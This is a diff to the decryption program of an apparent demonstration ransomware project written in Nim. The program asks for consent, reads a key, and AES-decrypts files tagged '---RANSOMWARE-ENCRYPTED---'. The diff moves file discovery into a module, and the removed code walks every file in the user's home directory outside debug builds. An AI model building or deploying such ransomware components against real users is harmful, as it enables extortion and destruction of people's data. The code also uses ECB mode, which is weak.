@@ -1,7 +1,7 @@
 # This is just an example to get you started. A typical binary package
 # uses this file as the main entry point of the application.
-import std/[base64, os, strutils]
-import nimalicious/[consent, crypto]
+import std/[base64, strutils]
+import nimalicious/[consent, crypto, files]
 import nimcrypto
 
 askConsent(
@@ -13,31 +13,15 @@ echo "You need the encryption key in order to continue:"
 stdout.write("\n> ")
 let key = readLine(stdin)
 
-when defined(debug):
-  # Make a dummy file specifically to be encrypted and decrypted.
-  proc findFiles*(): seq[string] =
-    try:
-      writeFile("dummy_file.txt", "Hello World!")
-      return @["dummy_file.txt"]
-    except:
-      # Return nothing as a safe measure.
-      return @[]
-else:
-  # Search *everywhere* in the user's home directory.
-  proc findFiles*(): seq[string] =
-    for kind, path in walkDir(dir = getHomeDir(), skipSpecial = true):
-      if kind == pcFile: result.add(path)
-    return result
-
 # Initialize encryption.
 var algo: ECB[aes256]
 algo.init(key)
 
-let files = findFiles()
+let filesx = findFiles()
 var i = 0
-for file in files:
+for file in filesx:
   inc(i)
-  echo "Trying to decrypt ", i, " file out of ", len(files), " files. (", file, ")"
+  echo "Trying to decrypt ", i, " file out of ", len(filesx), " files. (", file, ")"
   var contents = readFile(file)
   if not contents.startsWith("---RANSOMWARE-ENCRYPTED---\n"):
     echo "Skipping, since it might not be encrypted anyway."
